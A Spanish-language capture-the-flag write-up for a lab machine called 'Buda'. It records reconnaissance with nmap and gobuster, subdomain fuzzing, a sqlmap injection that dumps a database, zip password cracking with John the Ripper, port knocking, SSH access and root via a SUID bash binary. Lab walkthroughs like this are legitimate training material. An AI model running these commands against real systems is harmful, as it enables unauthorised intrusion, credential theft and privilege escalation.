---
tags:
  - Cybersecurity
  - Labs
  - TheHackersLabs
  - Medium
  - HTTP
  - SQLI
  - FTP
  - JohnTheRipper
  - PortKnocking
  - SSH
  - PrivilegeEscalation
  - SUID
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
	- [[#Enumeración#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#SQL Injection (SQLi)|SQL Injection (SQLi)]]
	- [[#Explotación#FTP|FTP]]
	- [[#Explotación#John The Ripper|John The Ripper]]
	- [[#Explotación#Port Knocking|Port Knocking]]
	- [[#Explotación#SSH|SSH]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Privilegios SUID|Privilegios SUID]]

---
# Buda

![](Screenshots/buda.png)

> En este write-up se documenta la resolución completa de la máquina **Buda** de [The Hackers Labs](). El laboratorio combina técnicas clásicas de **enumeración web**, **SQL Injection**, acceso a servicios **FTP**, uso de **port knocking** y una escalada final de privilegios mediante un binario **SUID mal configurado**, permitiendo obtener acceso **root**.

---
## Enumeración
### Ping

`ping -c 1 192.168.1.36`

![](Screenshots/Pasted%20image%2020260102174026.png)
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 192.168.1.36 -oG allPorts`

![](Screenshots/Pasted%20image%2020260102174145.png)

`nmap -p21,80 -sCV 192.168.1.36 -oN targeted`

![](Screenshots/Pasted%20image%2020260102174204.png)
### HTTP

`http://192.168.1.36/`

![](Screenshots/Pasted%20image%2020260102174359.png)
### Fuzzing Web

`gobuster dir -u http://192.168.1.36/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020260102180301.png)

Se encuentran los siguientes directorios:
- `index.html`
- `robots.txt`

`http://192.168.1.36/robots.txt`

![](Screenshots/Pasted%20image%2020260102180324.png)

Se añade al `/etc/hosts`: `echo "192.168.1.36 budasec.thl" >> /etc/hosts`.

`http://budasec.thl/`

![](Screenshots/Pasted%20image%2020260102181039.png)

`gobuster dir -u http://budasec.thl/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020260102182724.png)

`wfuzz -c --hl=363 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.budasec.thl" -u 192.168.1.36`

![](Screenshots/Pasted%20image%2020260102182933.png)

Se añade el subdominio al `hosts`: `echo "192.168.1.36 dev.budasec.thl" >> /etc/hosts`.

`http://dev.budasec.thl/`

![](Screenshots/Pasted%20image%2020260102183855.png)

Se encuentra un inicio de sesión.

---
## Explotación
### SQL Injection (SQLi)

Se comprueba si es vulnerable a **SQLi**.

`'`

![](Screenshots/Pasted%20image%2020260102183926.png)

`sqlmap -u "http://dev.budasec.thl/" --forms --dbms=mysql --dump`

![](Screenshots/Pasted%20image%2020260102185600.png)
### FTP

`ftp ftpuser@192.168.1.36`

![](Screenshots/Pasted%20image%2020260102190544.png)

Se descarga los archivos con `get`, no deja descargar `backup_2022`.

`cat decrypt.py`

![](Screenshots/Pasted%20image%2020260102190914.png)

`cat knock`

![](Screenshots/Pasted%20image%2020260102190935.png)

`unzip documents.zip`

Tiene contraseña.
### John The Ripper

`zip2john documents.zip > ziphash`

`john --wordlist=/usr/share/wordlists/rockyou.txt ziphash`

![](Screenshots/Pasted%20image%2020260102191136.png)

`unzip documents.zip`

`cat audit2024`

![](Screenshots/Pasted%20image%2020260102191435.png)

Se intenta acceder con las credenciales obtenidas a *ftp*, pero no es posible.
### Port Knocking

![](Screenshots/Pasted%20image%2020260102192423.png)

Tenemos un archivo llamado `knock` con una secuencia de puertos.

Se usa la herramienta: [Knocklt](https://github.com/eliemoutran/KnockIt).

```Bash
git clone https://github.com/eliemoutran/KnockIt.git
cd KnockIt
python3 knockit.py -b 192.168.1.36 1739 9467 8745
```

![](Screenshots/Pasted%20image%2020260102192853.png)

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 192.168.1.36 -oG allPorts`

![](Screenshots/Pasted%20image%2020260102192927.png)
### SSH

`ssh yolanda@192.168.1.36`

Se encuentra la *flag de usuario* en `/home/yolanda/user.txt`.

---
## Escalada de Privilegios
### Privilegios SUID

`find / -perm -4000 2>/dev/null`

![](Screenshots/Pasted%20image%2020260102193457.png)

[GTFOBins - Bash](https://gtfobins.github.io/gtfobins/bash/#suid).

`/usr/bin/bash -p`

Se obtiene un *bash* siendo **Root**.

Se encuentra la *flag de root*: `/root.root.txt`.

---